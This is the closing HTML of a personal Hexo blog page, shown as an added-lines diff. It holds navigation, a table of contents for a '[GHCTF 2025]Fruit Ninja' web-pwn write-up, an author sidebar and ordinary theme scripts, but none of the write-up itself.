+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Fruit-Ninja"><span class="toc-number">1.</span> <span class="toc-text">[GHCTF 2025]Fruit Ninja</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#accept-request"><span class="toc-number">1.1.2.</span> <span class="toc-text">accept_request()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execute-cgi"><span class="toc-number">1.1.3.</span> <span class="toc-text">execute_cgi</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-Payload-%E4%B8%8E-HTTP-%E5%8F%91%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">构造 Payload 与 HTTP 发包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-Shell-%E4%B8%8E%E6%8E%A5%E7%AE%A1%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">反弹 Shell 与接管控制权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "[GHCTF 2025]Fruit Ninja",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/WEB-PWN/%5BGHCTF2025%5DFruitNinja/",
+          excerpt: "",
+          description: "",
+          stripContent: "[GHCTF 2025]Fruit Ninja不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：[GHCTF 2025]Fruit Ninja | NSS 下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：  程序分析：我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：   这是一个非常经典的轻量级嵌入式 Web 服务器的二进制逆向分析，是一个典型的多线程并发处理模型。   main1234567891",
+          date: "Sat May 23 2026 02:46:49 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
